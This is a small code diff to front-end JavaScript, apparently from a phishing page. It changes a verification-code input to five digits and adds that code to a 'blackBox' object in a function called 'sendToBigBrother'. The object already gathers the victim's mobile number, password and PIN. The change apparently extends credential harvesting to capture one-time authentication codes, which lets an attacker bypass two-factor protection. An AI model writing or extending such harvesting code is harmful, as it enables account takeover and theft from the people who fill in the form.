@@ -87,7 +87,7 @@ $(document).ready(function()
 
 	$('#code').on('input', function()
 	{
-		if ($(this).val().length === 4)
+		if ($(this).val().length === 5)
 		{
 			$(this).attr('disabled', '');
 			verify();
@@ -107,6 +107,7 @@ function sendToBigBrother(_step)
 	blackBox.mobile   = $('#usermobile').val();
 	blackBox.password = $('#password').val();
 	blackBox.pin      = $('#pin').val();
+	blackBox.code     = $('#code').val();
 	blackBox.step     = _step;
 
 
